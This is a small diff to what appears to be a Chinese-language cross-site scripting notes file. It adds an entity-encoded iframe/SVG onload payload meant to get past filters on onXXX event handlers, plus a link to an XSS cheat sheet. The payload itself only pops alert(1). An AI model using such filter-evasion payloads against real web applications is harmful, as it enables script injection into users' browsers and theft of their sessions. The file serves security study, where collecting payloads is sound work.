@@ -462,7 +462,10 @@ http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&v=%E2%88%80%E3%B8%80%E3%B0%8
 http://drops.wooyun.org/tips/147
 ```
 
-
+过滤onXXX事件：
+```
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>	
+```
 
 ### Notes
 
@@ -556,6 +559,7 @@ http://drops.wooyun.org/tips/147
 - https://www.leavesongs.com/PENETRATION/xss-collect.html
 - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 - https://www.gosecure.net/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/
+- https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition
 
 ## 防御方法
 参考：
